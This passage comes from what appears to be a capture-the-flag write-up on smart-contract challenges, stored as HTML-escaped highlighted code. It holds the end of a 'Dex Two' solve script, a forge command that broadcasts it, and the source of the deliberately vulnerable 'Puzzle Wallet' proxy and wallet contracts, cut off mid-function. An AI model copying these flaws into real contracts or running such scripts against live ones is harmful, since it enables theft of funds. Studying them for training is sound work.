&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;_mint&lt;&#x2F;span&gt;&lt;span&gt;(msg&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;sender&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;10000&lt;&#x2F;span&gt;&lt;span&gt;)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;}
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;To run script :&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;bash&quot; style=&quot;background-color:#fafafa;color:#61676c;&quot; class=&quot;language-bash &quot;&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;$&lt;&#x2F;span&gt;&lt;span&gt; source .env
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;$&lt;&#x2F;span&gt;&lt;span&gt; forge script script&#x2F;DexTwoSolve.s.sol:DexTwoSolve&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt; --rpc-url &lt;&#x2F;span&gt;&lt;span&gt;$RPC_URL&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt; --broadcast
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;h1 id=&quot;24-puzzle-wallet&quot;&gt;&lt;a class=&quot;zola-anchor&quot; href=&quot;#24-puzzle-wallet&quot; aria-label=&quot;Anchor link for: 24-puzzle-wallet&quot;&gt;24 Puzzle Wallet&lt;&#x2F;a&gt;&lt;&#x2F;h1&gt;
&lt;p&gt;&lt;code&gt;PuzzleWallet.sol&lt;&#x2F;code&gt;&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;javascript&quot; style=&quot;background-color:#fafafa;color:#61676c;&quot; class=&quot;language-javascript &quot;&gt;&lt;code class=&quot;language-javascript&quot; data-lang=&quot;javascript&quot;&gt;&lt;span style=&quot;font-style:italic;color:#abb0b6;&quot;&gt;&#x2F;&#x2F; SPDX-License-Identifier: MIT
&lt;&#x2F;span&gt;&lt;span&gt;pragma solidity &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;^&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0.8&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;pragma experimental ABIEncoderV2&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;import &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;.&#x2F;helpers&#x2F;UpgradeableProxy-08.sol&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;contract PuzzleProxy is UpgradeableProxy {
&lt;&#x2F;span&gt;&lt;span&gt;    address public pendingAdmin&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;    address public admin&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;constructor&lt;&#x2F;span&gt;&lt;span&gt;(address _admin&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;address _implementation&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;bytes memory _initData) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;UpgradeableProxy&lt;&#x2F;span&gt;&lt;span&gt;(_implementation&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;_initData) {
&lt;&#x2F;span&gt;&lt;span&gt;        admin &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;_admin&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    modifier onlyAdmin {
&lt;&#x2F;span&gt;&lt;span&gt;      &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;require&lt;&#x2F;span&gt;&lt;span&gt;(msg&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;sender &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;== &lt;&#x2F;span&gt;&lt;span&gt;admin&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;Caller is not the admin&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;      _&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;function &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;proposeNewAdmin&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;address _newAdmin&lt;&#x2F;span&gt;&lt;span&gt;) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;external &lt;&#x2F;span&gt;&lt;span&gt;{
&lt;&#x2F;span&gt;&lt;span&gt;        pendingAdmin &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;_newAdmin&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;function &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;approveNewAdmin&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;address _expectedAdmin&lt;&#x2F;span&gt;&lt;span&gt;) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;external onlyAdmin &lt;&#x2F;span&gt;&lt;span&gt;{
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;require&lt;&#x2F;span&gt;&lt;span&gt;(pendingAdmin &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;== &lt;&#x2F;span&gt;&lt;span&gt;_expectedAdmin&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;Expected new admin by the current admin is not the pending admin&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;        admin &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;pendingAdmin&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;function &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;upgradeTo&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;address _newImplementation&lt;&#x2F;span&gt;&lt;span&gt;) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;external onlyAdmin &lt;&#x2F;span&gt;&lt;span&gt;{
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;_upgradeTo&lt;&#x2F;span&gt;&lt;span&gt;(_newImplementation)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;}
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;contract PuzzleWallet {
&lt;&#x2F;span&gt;&lt;span&gt;    address public owner&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;    uint256 public maxBalance&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;mapping&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;address &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;=&amp;gt; &lt;&#x2F;span&gt;&lt;span&gt;bool) public whitelisted&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;mapping&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;address &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;=&amp;gt; &lt;&#x2F;span&gt;&lt;span&gt;uint256) public balances&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;function &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;init&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;uint256 _maxBalance&lt;&#x2F;span&gt;&lt;span&gt;) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;public &lt;&#x2F;span&gt;&lt;span&gt;{
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;require&lt;&#x2F;span&gt;&lt;span&gt;(maxBalance &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;== &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;Already initialized&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;        maxBalance &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;_maxBalance&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;        owner &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;msg&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;sender&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    modifier onlyWhitelisted {
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;require&lt;&#x2F;span&gt;&lt;span&gt;(whitelisted[msg&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;sender]&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;Not whitelisted&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;        _&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;function &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;setMaxBalance&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;uint256 _maxBalance&lt;&#x2F;span&gt;&lt;span&gt;) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;external onlyWhitelisted &lt;&#x2F;span&gt;&lt;span&gt;{
&lt;&#x2F;span&gt;&lt;span&gt;      &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;require&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;address&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;this&lt;&#x2F;span&gt;&lt;span&gt;)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;balance &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;== &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;Contract balance is not 0&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;      maxBalance &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;_maxBalance&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;function &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;addToWhitelist&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;address addr&lt;&#x2F;span&gt;&lt;span&gt;) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;external &lt;&#x2F;span&gt;&lt;span&gt;{
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;require&lt;&#x2F;span&gt;&lt;span&gt;(msg&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;sender &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;== &lt;&#x2F;span&gt;&lt;span&gt;owner&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;Not the owner&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;        whitelisted[addr] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;true&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;function &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;deposit&lt;&#x2F;span&gt;&lt;span&gt;() &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;external payable onlyWhitelisted &lt;&#x2F;span&gt;&lt;span&gt;{
&lt;&#x2F;span&gt;&lt;span&gt;      &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;require&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;address&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;this&lt;&#x2F;span&gt;&lt;span&gt;)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;balance &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;&amp;lt;= &lt;&#x2F;span&gt;&lt;span&gt;maxBalance&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;Max balance reached&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;      balances[msg&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;sender] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;+= &lt;&#x2F;span&gt;&lt;span&gt;msg&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;value&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;function &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;execute&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;address to&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;uint256 value&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;bytes calldata data&lt;&#x2F;span&gt;&lt;span&gt;) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;external payable onlyWhitelisted &lt;&#x2F;span&gt;&lt;span&gt;{
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;require&lt;&#x2F;span&gt;&lt;span&gt;(balances[msg&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;sender] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;&amp;gt;= &lt;&#x2F;span&gt;&lt;span&gt;value&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;Insufficient balance&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;        balances[msg&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;sender] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;-= &lt;&#x2F;span&gt;&lt;span&gt;value&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;        (bool success&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;to&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;call{ &lt;&#x2F;span&gt;&lt;span style=&quot;color:#399ee6;&quot;&gt;value&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;: &lt;&#x2F;span&gt;&lt;span&gt;value }(data)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;require&lt;&#x2F;span&gt;&lt;span&gt;(success&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;Execution failed&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;function &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;multicall&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;bytes&lt;&#x2F;span&gt;&lt;span&gt;[] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;calldata data&lt;&#x2F;span&gt;&lt;span&gt;) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;external payable onlyWhitelisted &lt;&#x2F;span&gt;&lt;span&gt;{
&lt;&#x2F;span&gt;&lt;span&gt;        bool depositCalled &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;false&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;for &lt;&#x2F;span&gt;&lt;span&gt;(uint256 i &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;; &lt;&#x2F;span&gt;&lt;span&gt;i &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;&amp;lt; &lt;&#x2F;span&gt;&lt;span&gt;data&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;length&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;; &lt;&#x2F;span&gt;&lt;span&gt;i&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;++&lt;&#x2F;span&gt;&lt;span&gt;) {
&lt;&#x2F;span&gt;&lt;span&gt;            bytes memory _data &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;data[i]&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;            bytes4 selector&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;            assembly {
&lt;&#x2F;span&gt;&lt;span&gt;                &lt;&#x2F;span&gt;&lt;span style=&quot;color:#399ee6;&quot;&gt;selector &lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;:&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;mload&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;add&lt;&#x2F;span&gt;&lt;span&gt;(_data&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;32&lt;&#x2F;span&gt;&lt;span&gt;))
&lt;&#x2F;span&gt;&lt;span&gt;            }
&lt;&#x2F;span&gt;&lt;span&gt;            &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;if &lt;&#x2F;span&gt;&lt;span&gt;(selector &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;== &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;this&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;deposit&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;selector) {
&lt;&#x2F;span&gt;&lt;span&gt;                &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;require&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;!&lt;&#x2F;span&gt;&lt;span&gt;depositCalled&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;Deposit can only be called once&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;                &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#abb0b6;&quot;&gt;&#x2F;&#x2F; Protect against reusing msg.value
&lt;&#x2F;span&gt;&lt;span&gt;                depositCalled &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;true&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;            }
